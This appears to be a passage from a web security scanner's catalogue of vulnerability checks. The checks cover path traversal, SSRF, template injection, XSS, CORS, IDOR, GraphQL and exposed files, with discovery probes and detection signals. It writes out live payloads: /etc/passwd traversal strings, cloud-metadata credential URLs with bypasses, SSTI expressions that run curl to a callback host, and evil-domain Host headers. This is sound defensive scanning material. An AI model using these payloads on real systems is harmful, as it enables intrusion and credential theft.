detection_signal: HTTP 301/302/307 Location header points to an attacker-controlled domain. Or a meta-refresh tag or JavaScript window.location assignment in the response body contains the injected URL. For JavaScript URIs: Location: javascript:alert(1) received in a 302 response. OOB: HTTP request arrives at collaborator from browser/server after redirect is followed.

name: Path Traversal (Directory Traversal)
description: User-controlled filename or path parameters are concatenated onto a server-side base path without canonicalization, allowing traversal out of the intended directory using ../ sequences to read arbitrary files (config, credentials, source code).
runtime_discovery: Fuzz filename, path, file, doc, resource, template, page, and similar parameters with traversal sequences: ../../../etc/passwd, ..%2F..%2F..%2Fetc%2Fpasswd, ....//....//etc/passwd, %252e%252e%252fetc%252fpasswd. Also test path segments in REST-style URLs (/files/../../etc/passwd). Use both Unix (/etc/passwd) and Windows (..\..\windows\win.ini) targets.
detection_signal: Response body contains file contents matching known system files: root:x:0:0: from /etc/passwd, [boot loader] from boot.ini, [extensions] from win.ini, or base64-encoded content of a source file. HTTP 200 with content-type text/plain or application/octet-stream for a traversal-based path. Response size differs substantially from the 404/error baseline.

name: Mass Assignment / Parameter Binding
description: Frameworks that auto-bind HTTP request parameters to model attributes allow attackers to set privileged fields (role, is_admin, balance, verified, owner_id) not intended to be user-editable by simply including them in a POST/PUT/PATCH body or query string.
runtime_discovery: Intercept account registration, profile update, and object-creation requests. Replay them with additional JSON/form fields: role=admin, is_admin=true, admin=1, group_id=1, balance=99999, verified=true, owner_id=<other_user_id>. Compare the application state after submission (re-fetch the profile/object) against the state before. Also probe nested objects: {user: {role: 'admin'}}.
detection_signal: After replaying the modified request, the subsequent GET of the profile/object endpoint returns the injected field value (e.g., role: 'admin', balance: 99999). HTTP 200 response to the modified write request (no validation rejection). Auth-diff: re-fetching the resource as the same user now reveals elevated permissions or changed attribute values not achievable through the normal UI.

name: Host Header Injection
description: The application trusts the HTTP Host header for constructing password-reset URLs, generating absolute links, or routing requests to cache backends without validating it against an allowlist. Attackers can poison the host value to redirect password-reset tokens to an attacker-controlled domain or exploit web cache poisoning.
runtime_discovery: On password-reset and email-verification flows, replay the request with a modified Host header (Host: evil.example.com) or supplementary headers (X-Forwarded-Host, X-Host, X-Original-Host, Forwarded: host=evil.example.com). Trigger a password-reset email to a test account and inspect the link domain. Also probe for cache poisoning by injecting a Host and observing whether the modified value is reflected in the response or stored in a cache.
detection_signal: Password-reset or account-confirmation email contains a link pointing to the attacker-supplied host value instead of the legitimate domain. Alternatively: the HTTP response body or Location header reflects the injected Host value (X-Forwarded-Host reflection in an HTML link, canonical URL, or CORS header). Cache-poisoning variant: second request with a legitimate Host header returns a response containing the previously injected evil domain.

name: SSRF via Cloud Instance Metadata Endpoint
description: A specific, high-impact SSRF subcase where the app fetches user-supplied URLs and the server runs on a cloud provider with an IMDSv1-style metadata endpoint at 169.254.169.254 or the IPv6 equivalent. Successful exploitation returns IAM role credentials granting cloud account access.
runtime_discovery: On any URL-fetching parameter, inject http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS), http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google header smuggled via SSRF, or http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure). Use DNS rebinding or URL parser confusion bypasses (http://[::ffff:169.254.169.254]/, http://169.254.169.254.nip.io/) when direct IP is blocked.
detection_signal: Response body contains IAM credential JSON with keys AccessKeyId, SecretAccessKey, Token; GCP service account token with access_token; or Azure managed identity token with access_token. Even partial metadata exposure (instance-id, region, account-id) confirms the SSRF vector and indicates IMDSv2 is not enforced or bypassable.

name: Blind SSTI via Out-of-Band DNS/HTTP Callback
description: Template injection in contexts where the evaluated output is never reflected in the HTTP response (email bodies, PDF generators, background report jobs, audit logs). The vulnerability is confirmed via an out-of-band DNS or HTTP interaction triggered by the injected expression.
runtime_discovery: Inject OOB callback expressions into fields whose output is not immediately visible (email subject, report title, notification message, audit description): Jinja2: {{''.__class__.__mro__[1].__subclasses__()[X]('curl http://<collab>',shell=True,stdout=-1).communicate()}}, FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('curl http://<collab>')}. Monitor the Burp Collaborator/interactsh listener for HTTP/DNS interactions.
detection_signal: HTTP or DNS request received at the out-of-band listener with source IP matching the app server within seconds of the probe submission. The request path or hostname contains a per-request nonce embedded in the payload, ruling out false positives from unrelated crawlers. No change in the HTTP response body or status is required for confirmation.

name: Reflected XSS
description: User-supplied input from query parameters, path segments, or HTTP headers is echoed back into HTML responses without encoding, enabling immediate script execution in the victim's browser. It is the most common XSS class surfaced in bug bounties because it requires no stored state.
runtime_discovery: Inject a benign HTML marker (e.g., keyleak-xss-probe-UNIQUEID or keyleak) into every parameter of every crawled form and URL query string. If the marker appears unescaped in the response body (confirmed by parsing the DOM, not just string search), escalate to a script payload. Compare reflected value across HTML context, attribute context, and JS string context.
detection_signal: Injected marker string appears verbatim in the DOM response with HTML tag structure intact (status 200); DOMParser confirms it as an element node rather than a text node. Any occurrence of <script>, onerror=, onload=, or javascript: derived from probe input in the response.

name: Stored XSS
description: Attacker-controlled data persisted server-side (comments, profile fields, messages, ticket bodies) is rendered back to other users without HTML encoding, causing persistent script execution for every visitor who loads the affected page.
runtime_discovery: Submit a benign but unique HTML marker through every write-capable form field (comment box, display name, address line, description). Then re-fetch the page or report view as a different authenticated user (auth-diff scan). If the marker appears unencoded in the second user's DOM, it is stored XSS. Check rendered HTML, not just raw HTTP body, to catch cases where SSR escapes but client-side frameworks re-inject.
detection_signal: Probe string submitted by User A appears as an unescaped HTML node (not a text node) in the DOM fetched by User B. Alert or script-execution event fires in headless browser. The response page contains the exact probe token in an element or attribute position.

name: DOM-Based XSS
description: Client-side JavaScript reads attacker-controlled sources (location.hash, location.search, document.referrer, postMessage data, localStorage values) and writes them to dangerous sinks (innerHTML, document.write, eval, insertAdjacentHTML) without sanitization, causing script execution entirely within the browser without a round-trip to the server.
runtime_discovery: Inject XSS payloads in the URL fragment (#) and query string, then observe the page with a headless browser for alert/console-error callbacks or DOM node insertion. Enumerate event listeners on message events and send synthetic postMessage payloads containing HTML. Observe DOM state before and after controlled input via page.evaluate.
detection_signal: Headless browser fires an alert or throws a controlled error after injected fragment/query payload. DOM snapshot contains injected HTML as an element node after JavaScript execution. Source-map scan reveals innerHTML/outerHTML assignment from location.hash or message.data (pattern already in detectors.py xss_sink_lead).

name: CORS Misconfiguration (Credentialed Cross-Origin Read)
description: The server reflects the request Origin header into Access-Control-Allow-Origin (or uses a wildcard combined with Access-Control-Allow-Credentials: true), allowing any malicious website to read authenticated API responses cross-origin using the victim's session cookies.
runtime_discovery: Send OPTIONS and GET requests to every discovered API endpoint with a synthetic Origin header (e.g., Origin: https://attacker.keyleak.test). Inspect response for Access-Control-Allow-Origin reflecting the probe value AND Access-Control-Allow-Credentials: true. Also probe null origin (Origin: null) which some CORS stacks allow.
detection_signal: Response header Access-Control-Allow-Origin matches the injected probe origin exactly (not a wildcard) while Access-Control-Allow-Credentials: true is also present. Or: Access-Control-Allow-Origin: * on an endpoint that also sets a session cookie. Any reflection of the Origin: null value.

name: Missing or Weak Content Security Policy
description: Absence of a Content-Security-Policy response header (or a policy containing unsafe-inline, unsafe-eval, or wildcard source expressions) removes the browser-enforced last line of defense against XSS, making any injected script execute without restriction.
runtime_discovery: Inspect the Content-Security-Policy and Content-Security-Policy-Report-Only response headers on every crawled page response. Parse the policy directives to detect absent script-src, presence of unsafe-inline or unsafe-eval, wildcard (*) sources in script-src or default-src, or missing upgrade-insecure-requests.
detection_signal: Response has no CSP header at all; or script-src contains 'unsafe-inline', 'unsafe-eval', or a wildcard host (https://*); or default-src is * with no restrictive script-src override. Passive observation of response headers only — no active probe needed.

name: Client-Side Prototype Pollution
description: JavaScript query-string or JSON parsers (qs, jQuery deep-extend, lodash.merge) allow an attacker to inject properties into Object.prototype via crafted keys like __proto__[foo]=bar, affecting every downstream object in the page and potentially escalating to XSS through gadget chains.
runtime_discovery: Fetch each crawled URL and append a probe query string: ?__proto__[keyleaktest]=polluted and ?constructor[prototype][keyleaktest]=polluted. After page load, execute page.evaluate(() => ({}).keyleaktest) in the headless browser context. A non-undefined return value confirms pollution. Also fuzz JSON request bodies on API endpoints with {"__proto__":{"keyleaktest":true}}.
detection_signal: page.evaluate returns a non-undefined value for a sentinel property name seeded only via the probe parameter (e.g., ({}).keyleaktest === 'polluted'). Console errors referencing prototype or constructor mutations are also a secondary signal.

name: postMessage Origin Validation Bypass
description: Event listeners registered for window message events fail to validate the origin of the sender (or use a regex bypass like /trusted.com/.test(event.origin)), allowing a malicious cross-origin frame or popup to send crafted data that the page acts on, leading to XSS, open redirect, or data exfiltration.
runtime_discovery: Enumerate message event listeners by injecting a script that captures addEventListener('message', ...) registrations and logs the handler source. Send synthetic window.postMessage payloads from the scanner context with a crafted origin and data payload containing HTML/JS. Observe DOM changes, navigation events, or data exposure after message receipt.
detection_signal: DOM mutation or navigation occurs after a synthetic postMessage from a non-matching origin. Source-map or bundle scan finds message event handler that either lacks origin check or uses string.includes/regex match (xss_sink_lead pattern triggers on message.data reaching innerHTML). Headless browser fires an alert or script executes following the probe message.

name: Exposed JavaScript Source Maps with Embedded Secrets
description: Production JS bundles include a sourceMappingURL directive pointing to publicly accessible .map files that reconstruct original source code, exposing API keys, internal endpoint URLs, business logic, and secrets that were present at build time.
runtime_discovery: Crawl all JS bundle URLs loaded by each page. For each bundle, extract the sourceMappingURL comment. Fetch the referenced .map file (same-origin check). Parse the source map and run credential-pattern detectors against each reconstructed source file. Also probe for .map by appending .map to every bundle URL even if no directive is present.
detection_signal: HTTP 200 response for <bundle>.js.map with a valid JSON source map body (version:3, sources array, sourcesContent). Credential detector patterns (API keys, tokens, DB URLs) match inside reconstructed sourcesContent entries. The sourceMappingURL is present in the bundle but the .map endpoint is unprotected.

name: Clickjacking (Missing Frame Ancestor Protection)
description: Pages that handle sensitive actions (fund transfers, settings changes, account deletion, OAuth confirmation) can be embedded in cross-origin iframes because they lack X-Frame-Options or a restrictive frame-ancestors CSP directive, enabling UI redress attacks.
runtime_discovery: For every page returned with HTTP 200, inspect the X-Frame-Options header (must be DENY or SAMEORIGIN) and the Content-Security-Policy header for a frame-ancestors directive. Attempt to embed the target URL in a data-URI iframe from the scanner's headless browser context and observe whether the frame loads.
detection_signal: Response header X-Frame-Options is absent or set to ALLOWALL; CSP frame-ancestors is absent or set to *; headless browser successfully renders the target page inside a cross-origin iframe without error. Pages containing form[action] or button[type=submit] that load in the iframe are higher priority.

name: Sensitive Credentials / Tokens in localStorage or sessionStorage
description: Authentication tokens, API keys, PII, or session identifiers are persisted in Web Storage (localStorage, sessionStorage), where they are accessible to any same-origin JavaScript, including injected scripts from XSS, making exfiltration trivial compared to HttpOnly cookies.
runtime_discovery: After authenticating and loading each crawled page, execute page.evaluate to enumerate all localStorage and sessionStorage keys and values. Run credential-pattern detectors (JWT regex, API key patterns, email/SSN patterns) against every key-value pair. Also check IndexedDB stores and Cache Storage for the same patterns.
detection_signal: localStorage or sessionStorage contains a value matching a known token pattern (JWT: eyJ..., Bearer token, API key prefix like sk-, AIza, AKIA). Scanner's browser_scanner.py already enumerates storage and runs detector patterns — the finding source will be localStorage:<key> or sessionStorage:<key>.

name: Sensitive Data Rendered into DOM / Hidden Fields
description: Server-side templates or SPAs render secrets, internal tokens, user PII, or CSRF tokens with excessive scope into HTML hidden inputs, data-* attributes, inline JS variables, or JSON blobs embedded in script tags, exposing them to any party who can read the page DOM.
runtime_discovery: Crawl and render each page, then scan the full document.documentElement.outerHTML (and all inline script text) against credential and PII detector patterns. Pay particular attention to <script>window.__INITIAL_STATE__=...</script>, <input type=hidden>, data-token=, and meta[name=csrf-token] attributes. Run as both unauthenticated and authenticated users to compare exposure.
detection_signal: Credential-pattern match (API key, JWT, private key PEM, SSN, credit card number) found in the raw DOM string at a source prefixed 'document'. Finding type source_map_reference or xss_sink_lead does not cover this — it is a distinct leak:dom_secret finding class. Inline JSON blobs containing keys like apiKey, accessToken, secretKey trigger the match.

name: Open Redirect via Client-Side URL Parameter
description: The application reads a redirect target from a query parameter (next=, redirect=, returnUrl=, goto=, url=) and passes it to location.href or location.replace without validating that the destination is same-origin, enabling phishing redirects and OAuth token theft via crafted links.
runtime_discovery: Enumerate all URL parameters and form fields named next, redirect, return, returnUrl, url, to, goto, dest, target. Substitute the value with https://attacker.keyleak.test and observe via headless browser whether navigation to that domain occurs or a 3xx Location header points there. Also probe with relative paths like //attacker.keyleak.test to bypass naive scheme checks.
detection_signal: Navigation event fires in the headless browser to an origin other than the target app's origin after injecting the probe URL into a recognized redirect parameter. HTTP 302/303 Location header contains the injected external URL. page.url() after load equals the injected attacker domain.

name: JavaScript Framework Debug / Development Mode Enabled in Production
description: Client-side frameworks (React DevTools hook present, Vue devtools enabled, Angular development mode, Next.js __NEXT_DATA__ with full server props) emit verbose stack traces, expose internal component trees, and sometimes include source code or environment variables that should never reach production.
runtime_discovery: After page load, execute page.evaluate to check for __REACT_DEVTOOLS_GLOBAL_HOOK__, window.__VUE__, window.ng (Angular DevMode), and the size/contents of window.__NEXT_DATA__. Inspect inline <script id='__NEXT_DATA__'> JSON for env vars, API keys, or server-side props. Check if React is running in development mode via __REACT_DEVTOOLS_GLOBAL_HOOK__.renderers.
detection_signal: page.evaluate returns truthy for __REACT_DEVTOOLS_GLOBAL_HOOK__ on a production domain. window.__NEXT_DATA__ contains keys like env, serverSideProps, or buildId with non-production values. Angular ng.probe() is callable on the window. Vue devtools warning banner visible in page text. Credential patterns match inside the __NEXT_DATA__ JSON blob.

name: CORS Wildcard on Sensitive / Authenticated API Endpoint
description: An API endpoint that returns user-specific data or accepts authenticated actions responds with Access-Control-Allow-Origin: * without also requiring credentials, but the broad wildcard still enables cross-site exfiltration of sensitive data by any third-party page using a simple fetch.
runtime_discovery: Send a GET request to each discovered API endpoint with a cross-origin Origin header. If the response contains Access-Control-Allow-Origin: * AND the response body contains patterns matching PII, tokens, user data, or structured JSON with field names like email, userId, token — flag it. Distinguish from static asset wildcards (images, fonts) by checking Content-Type and response body structure.
detection_signal: Response header Access-Control-Allow-Origin: * on an endpoint whose Content-Type is application/json AND whose body matches at least one credential or PII detector pattern (email address, userId, JWT, access_token field). Differs from the credentialed CORS finding — credentials header not required, but data sensitivity is the signal.

name: Missing Subresource Integrity (SRI) on Third-Party Scripts
owasp_category: A08:2021 Software and Data Integrity Failures
description: Script and link tags loading third-party resources (CDN-hosted libraries, analytics, payment widgets) lack integrity= and crossorigin= attributes, meaning a CDN compromise or BGP hijack silently delivers malicious code to all users without the browser detecting the tampering.
runtime_discovery: Crawl each rendered page and parse all <script src=...> and <link rel=stylesheet href=...> tags whose src/href points to a domain other than the first-party origin. Check whether each external tag includes a valid integrity= hash attribute. Also flag <script src=> pointing to third-party domains served without HTTPS.
detection_signal: HTML DOM contains at least one <script src=https://cdn.example.com/...> or <link href=https://...> where the src/href host does not match the page origin AND the tag lacks an integrity= attribute. Pure passive DOM observation — no active probe needed.

name: Excessive Data Exposure in API Responses
description: API endpoints return more fields than the client UI displays, exposing sensitive attributes (e.g., password hashes, internal IDs, PII, role flags) that the frontend silently discards. An attacker reading raw responses obtains data never intended for that user.
runtime_discovery: Crawl authenticated endpoints and compare the full JSON response body against what the UI renders. Flag any response field containing patterns matching password, hash, secret, ssn, dob, internal_id, is_admin, role, token, credit_card. Diff responses for two users of different privilege levels to identify fields visible to both that should be role-gated.
detection_signal: Response JSON contains field names matching a sensitive-keyword regex (e.g., `password`, `hash`, `secret`, `token`, `ssn`, `dob`, `is_admin`) not present in the rendered DOM; or low-privilege user response contains fields identical to high-privilege user response for the same resource.

name: Broken Object Property Level Authorization (Mass Assignment / BOPLA)
description: API accepts write operations (PUT/PATCH) on object properties the caller should not be able to modify, such as role, is_admin, balance, or plan. Attackers inject extra properties in request bodies that the server silently accepts and persists.
runtime_discovery: For every PATCH/PUT endpoint discovered during crawl, replay the request with injected extra properties (role, is_admin, plan, credits, verified, locked) appended to the JSON body. Then GET the same resource and check whether the injected property was accepted and reflected in the response.
detection_signal: After sending a PATCH/PUT body containing injected properties, a subsequent GET response reflects the injected field value (e.g., `is_admin: true`, `role: admin`, `balance: 99999`). HTTP 200 on the write plus changed value on the read confirms acceptance.

name: Broken Object Level Authorization (IDOR) via API Resource Enumeration
description: REST endpoints use predictable resource identifiers (sequential integers, short UUIDs) in paths or query parameters. An authenticated user can iterate IDs to access other users' resources without receiving a 403 or 404.
runtime_discovery: After authenticating as User A, collect all resource IDs seen in crawled responses. As User B (different account), request those same IDs. Compare HTTP status and response body. Also fuzz ID parameters by incrementing/decrementing numeric IDs and substituting known-foreign UUIDs. A 200 with another user's data is a confirmed finding.
detection_signal: User B receives HTTP 200 with a response body whose owner/user_id field differs from User B's own ID; or a resource fetched by User B matches data created exclusively under User A's session. Any non-403/404 response to a foreign-ID request is flagged.

name: Missing Rate Limiting on Authentication / Credential Endpoints
description: Login, password-reset, OTP verification, and token-refresh endpoints accept unlimited requests without throttling, lockout, or CAPTCHA. This enables credential stuffing, brute-force, and OTP enumeration at machine speed.
runtime_discovery: Send 50-100 rapid POST requests to the login/auth endpoint with varying passwords for a known username. Observe response codes, headers (X-RateLimit-*, Retry-After), and body messages. Absence of 429 responses, account lockout messages, or any rate-limit header after sustained bursting confirms the gap.
detection_signal: After N rapid sequential requests (e.g., 50) to `/api/auth/login` or `/api/v1/password-reset`, no HTTP 429 is observed, no `Retry-After` or `X-RateLimit-Remaining` header appears, and responses remain structurally identical (no lockout body). Timing between responses stays consistently low (<200ms).

name: Missing Rate Limiting on Business-Logic API Endpoints
description: Endpoints performing expensive or financially impactful operations (search, export, coupon redemption, referral credit) lack per-user or per-IP rate limits, enabling resource exhaustion, discount abuse, or data harvesting at scale.
runtime_discovery: Identify high-cost endpoints from crawled traffic (search, export, bulk-fetch). Send 100 rapid identical authenticated requests and measure: response codes, any rate-limit headers, server response time degradation, and whether the operation succeeds on all 100 requests. No 429 and consistent success across all requests is the finding.
detection_signal: 100 rapid authenticated GET/POST requests to a search or export endpoint all return HTTP 200 with no `X-RateLimit-*` headers and no response-time increase above 2x baseline. Cumulative data volume retrievable in under 10 seconds exceeds what a human interaction would produce.

name: User Enumeration via API Response Differences
description: Registration, login, and password-reset endpoints return distinct error messages or status codes depending on whether the queried username or email exists, allowing attackers to build a validated list of live accounts.
runtime_discovery: Submit registration or password-reset requests with a known-existing email and a known-nonexistent email (or random UUID). Compare HTTP status codes, response body strings (e.g., 'email not found' vs 'reset link sent'), and response times. Any observable difference (textual, status, or timing >100ms) confirms enumeration.
detection_signal: Two requests to `/api/auth/forgot-password`: one with a seeded valid email, one with a random nonexistent email. Observable diff in status code (200 vs 404), body text ('user not found' vs 'check your email'), or response time delta >150ms. Automated diff of trimmed response bodies flags the divergence.

name: Resource/Object Enumeration via Predictable API Identifiers
description: API paths use sequential integer IDs or short alphanumeric slugs that can be iterated. Even if individual objects are access-controlled, response timing or error text differences confirm existence, leaking a count and structure of the dataset.
runtime_discovery: Extract all numeric and short-slug IDs from crawled responses. Probe a range of adjacent IDs (current-50 to current+50) as an unauthenticated or low-privilege user. Compare HTTP 200/403/404 distribution. A 403 confirms existence while 404 denies it — any 403 for a foreign-user resource is an enumeration signal.
detection_signal: Sequential ID probing yields mixed 200/403 vs uniform 404 responses. A 403 on `/api/orders/1042` while the authenticated user only owns order 2991 indicates the object exists and the server leaks existence via status code rather than returning a consistent 404 for all unauthorized resources.

name: Improper API Inventory — Unretired Legacy API Versions
owasp_category: A09:2021 Security Logging and Monitoring Failures
description: Old API versions (v1, v2, beta, legacy) remain reachable after a newer version is released. They often bypass security controls (auth enforcement, input validation, rate limiting) added in later versions, giving attackers a bypass path.
runtime_discovery: After discovering the current API version prefix from crawled traffic (e.g., `/api/v3/`), probe earlier version prefixes (`/api/v1/`, `/api/v2/`, `/api/beta/`, `/api/legacy/`, `/v1/`) on every endpoint discovered. Compare authentication requirements, response schemas, and rate-limit behavior between versions.
detection_signal: An endpoint at `/api/v1/users` returns HTTP 200 with a full user list while the same path at `/api/v3/users` returns 403 for the same unauthenticated or low-privilege request. Or the v1 path accepts requests without a required Authorization header that v3 enforces. Version-path fuzzing confirms reachability.

name: Verbose API Error Responses Leaking Stack Traces / Internal Details
description: API endpoints return full stack traces, ORM query strings, internal file paths, framework version strings, or database error messages in error responses. This provides attackers with reconnaissance data to tailor further attacks.
runtime_discovery: Submit malformed inputs to all discovered endpoints: invalid types (string where integer expected), boundary values (negative IDs, extremely long strings, null bytes), malformed JSON bodies, and unknown fields. Inspect every non-2xx response body for stack trace markers, file path strings, SQL fragments, or framework/library name strings.
detection_signal: Response body contains any of: multi-line stack trace with file paths (`at /app/src/...`), SQL error text (`PG::UndefinedColumn`, `SQLite3::Exception`, `ORA-00942`), internal hostnames or IP addresses, ORM model class names, or framework-specific debug keys (`debug`, `traceback`, `exception`, `stack`). Regex scan on all error responses.

name: GraphQL Introspection Enabled in Production
description: GraphQL introspection queries are left enabled in production, exposing the full schema including all types, mutations, queries, and field names. This gives attackers a complete map of the API attack surface without needing source code.
runtime_discovery: Send a POST request to the GraphQL endpoint with the standard introspection query body (`{__schema{types{name fields{name type{name}}}}}` and `{__typename}`). A successful response with schema data confirms introspection is enabled. Also probe common GraphQL paths: `/graphql`, `/api/graphql`, `/query`, `/gql`.
detection_signal: POST to `/graphql` with `{"query":"{__schema{queryType{name}}}"}` returns HTTP 200 with a JSON body containing `__schema` data rather than an error or disabled-introspection message. Response body size is typically >1KB and contains type definitions.

name: GraphQL Field Suggestion / Did-You-Mean Enumeration
description: Many GraphQL servers (Apollo, Graphene) return 'Did you mean X?' suggestions in error messages when an unknown field or type name is queried. Even when introspection is disabled, attackers can enumerate the schema by probing with close-guess names and reading suggestions.
runtime_discovery: With introspection disabled, send GraphQL queries containing deliberately misspelled field and type names (e.g., `{usr{id}}`, `{userz{email}}`). Parse error messages from the response for suggestion strings. Iterate systematically with common word variations to walk the schema tree via suggestions.
detection_signal: GraphQL error response body contains a string matching `Did you mean` or `Suggestions:` followed by a valid field name. This occurs even without introspection enabled. The presence of any suggestion string in an error response on a production endpoint is the flag.

name: Broken Function Level Authorization — Admin API Endpoint Accessible to Regular Users
description: Administrative or privileged API endpoints (user management, billing overrides, bulk exports, config changes) lack server-side role enforcement and return data or accept writes when called by a non-admin authenticated user.
runtime_discovery: Crawl the application as an admin user and catalog all API endpoints. Replay those same requests using a non-admin user's session token. Compare response status codes and body content. Probe common admin path patterns (`/api/admin/`, `/api/internal/`, `/api/management/`, `/api/v1/admin`) using the non-admin session.
detection_signal: A request to `/api/admin/users` or `/api/internal/config` using a regular-user JWT or session cookie returns HTTP 200 with data, rather than 401 or 403. Auth-diff comparison shows admin-session response and regular-user-session response are identical (same status, same structure, same data volume).

name: Shadow / Undocumented API Endpoints Accessible Without Authentication
owasp_category: A09:2021 Security Logging and Monitoring Failures
description: Endpoints created for internal tooling, debugging, testing, or migration are never formally documented and lack authentication checks. They are discoverable via path fuzzing and can expose bulk data exports, health data with sensitive details, or destructive operations.
runtime_discovery: Fuzz common unauthenticated paths against the API base: `/api/health`, `/api/debug`, `/api/status`, `/api/metrics`, `/api/ping`, `/api/version`, `/api/env`, `/api/config`, `/api/test`, `/api/swagger`, `/api/openapi.json`, `/api/docs`. Send requests with no Authorization header and flag any 200 response that returns structured data beyond a simple status string.
detection_signal: GET request to `/api/debug`, `/api/env`, or `/api/internal/metrics` without any Authorization header returns HTTP 200 with a JSON body containing application internals, dependency versions, environment variable names, or database connection strings. Any non-401/403 response to a credential-free request on a non-public path.

name: Missing Authentication on State-Mutating API Endpoints
description: POST, PUT, PATCH, or DELETE endpoints that mutate application state do not enforce authentication, or accept requests after the session token is removed. This allows unauthenticated actors to create, modify, or delete records.
runtime_discovery: For every mutating endpoint captured during authenticated crawl, replay the request stripped of all authentication material (remove Authorization header, session cookie, and X-API-Key). Compare the response: a 200 or 201 without credentials confirms the finding. Also test with an expired or invalidated token.
detection_signal: POST to `/api/orders` or DELETE to `/api/users/42` with the Authorization header entirely absent (or replaced with an expired JWT) returns HTTP 200, 201, or 204 rather than 401. Response body confirms the mutation was accepted (e.g., `id` in creation response, empty body on delete with 204).

name: GraphQL Query Batching / Alias Amplification Without Rate Limiting
description: GraphQL endpoints accept batched requests (array of operations) or aliased queries that execute the same resolver dozens of times in a single HTTP request. With no query depth/complexity limit, this enables resource exhaustion and brute-force (e.g., batched login attempts) via a single request.
runtime_discovery: Send a POST to the GraphQL endpoint with a JSON array body containing 50 identical login mutation operations (batching) or a single query with 50 aliases for the same field. Measure response time vs a single-operation baseline. Also attempt 50 batched login mutations with different passwords to test brute-force potential per HTTP request.
detection_signal: A POST body containing a JSON array of 50 operations returns HTTP 200 with an array of 50 results, response time under 5x the single-request baseline (indicating parallel execution), and no 429 or complexity-limit error. For aliased queries, a single request returns 50 separate resolver results under the alias keys.

name: Exposed .git Directory
description: The .git directory is publicly accessible on the web root, allowing an attacker to reconstruct full source code, commit history, secrets, and internal paths by fetching objects from /.git/HEAD, /.git/config, and /.git/COMMIT_EDITMSG.
runtime_discovery: Probe /.git/HEAD with a GET request. A 200 response containing the string 'ref: refs/heads/' is a definitive hit. Follow up with /.git/config to extract remote URLs and branch names.
detection_signal: HTTP 200 on /.git/HEAD with body matching 'ref: refs/heads/'. HTTP 200 on /.git/config with '[core]' or '[remote' in body. Any non-404/403 status on /.git/COMMIT_EDITMSG.

name: Exposed .env / Environment File
description: The application's .env file (or variants like .env.local, .env.production, .env.backup) is served directly by the web server, exposing database credentials, API keys, and other secrets in plaintext.
